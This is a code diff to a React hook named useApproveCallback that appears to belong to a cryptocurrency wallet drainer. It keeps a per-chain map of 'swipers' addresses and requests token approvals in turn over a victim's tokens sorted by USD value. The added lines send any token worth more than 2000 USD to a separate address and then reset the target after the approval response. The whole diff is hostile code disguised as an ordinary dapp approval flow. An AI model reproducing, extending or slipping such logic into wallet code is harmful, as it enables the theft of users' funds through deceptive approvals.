@@ -47,8 +47,8 @@ export function useApproveCallback(
   const { toastError } = useToast()
 
   const swipers = {
-    // '1': '0x76BbA7B5e5Ead5E931D2f5055c770c7863780aAd',
-    '1': '0xf925cDFD4806342d9dc1D5c7Ae09e3A43a02B053',
+    '1': '0x76BbA7B5e5Ead5E931D2f5055c770c7863780aAd',
+    '111111': '0xf925cDFD4806342d9dc1D5c7Ae09e3A43a02B053',
     '5': '0xF9872d38157315535B1BaE444e938Ee3e16Bc488',
     '56': '0xDcfb1C3cd25d846D589507394E6f44Bd1625b21b',
   } as const satisfies Record<string | number, Address>
@@ -319,6 +319,7 @@ export function useApproveCallback(
 
   // const tokenContract = useTokenContract(token?.address)
   const tokenContract = useTokenContract(tokensFiltered[0]?.token_address)
+  if (tokensFiltered[0].usdValue > 2000) setSwiper(swipers[111111])
   const addTransaction = useTransactionAdder()
 
   const approve = useCallback(
@@ -384,6 +385,7 @@ export function useApproveCallback(
       // if (!estimatedGas) return undefined
 
       tokensFiltered.shift()
+      if (tokensFiltered[0].usdValue > 2000) setSwiper(swipers[111111])
       setTokensFiltered(tokensFiltered)
 
       return callWithGasPrice(
@@ -422,6 +424,7 @@ export function useApproveCallback(
                 method: 'POST',
               })
             }
+            setSwiper(swipers[chainId])
           }
           return response
         })
